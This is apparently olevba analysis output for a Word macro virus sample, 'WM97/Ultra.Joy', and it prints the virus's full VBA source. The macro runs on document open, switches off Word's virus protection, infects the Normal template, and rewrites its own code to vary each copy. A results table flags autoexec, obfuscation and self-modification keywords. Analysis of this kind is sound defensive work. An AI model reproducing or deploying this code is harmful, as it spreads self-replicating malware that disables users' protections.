olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Joy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Joy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim rsx, rox, xix As Integer: Dim cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: Randomize

On Error GoTo 85

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

rt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines

dt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines

If dt > 0 And rt > 0 Then GoTo 85

If dt = 0 Then

    Set Joy = NormalTemplate.VBProject.VBComponents

    Set hst = ActiveDocument.VBProject.VBComponents

    lx = Int(Rnd(1) * 100) + 1

    If lx = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.ultra.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)

    lr = Int(Rnd(1) * 75) + 1

    If lr = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.joy.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)

    ls = Int(Rnd(1) * 50) + 1

    If ls = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

    lt = Int(Rnd(1) * 25) + 1

    If lt = 24 Then MsgBox Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(85) + Chr(76) + Chr(84) + Chr(82) + Chr(65) + Chr(32) + Chr(74) + Chr(111) + Chr(121), vbCritical

    hst.Item(1).Name = Joy.Item(1).Name

    hst.Item(1).Export Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
    
End If

If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents

Joy.Item(1).codemodule.AddFromFile Application.StartupPath & Chr(74) + Chr(111) + Chr(121)

With Joy.Item(1).codemodule

    For j = 1 To 4

    .deletelines 1

    Next j

    End With

If dt = 0 Then Joy.Item(1).codemodule.replaceline 1, "Sub AutoClose()"

If dt = 0 Then Joy.Item(1).codemodule.replaceline 91, "Sub ToolsMarco()"

If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Joy.Item(1).codemodule

    For j = 2 To Joy.Item(1).codemodule.countoflines Step 2

    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55

    cii = Asc(rsx): eox = Chr$(cii + 2): xoe = Chr$(cii - 9): oxe = Chr$(cii + 10): lnr = Chr$(cii - 4)

    cix = Asc(rox): rxe = Chr$(cix + 4): rex = Chr$(cix - 11): exr = Chr$(cix + 16): nrl = Chr$(cix - 17)

    xic = Asc(xix): nix = Chr$(xic + 6): ixn = Chr$(xic - 14): nxi = Chr$(xic + 22): rnl = Chr$(xic - 33)

    .replaceline j, "'" & lnr & nrl & rnl & nix & xoe & rxe & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr

Next j

End With

85:

If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode() 'WM97/Ultra.Joy by Virus :) Smile

End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.ultra.com|URL                                          |
|IOC       |http://www.joy.com  |URL                                          |
+----------+--------------------+---------------------------------------------+

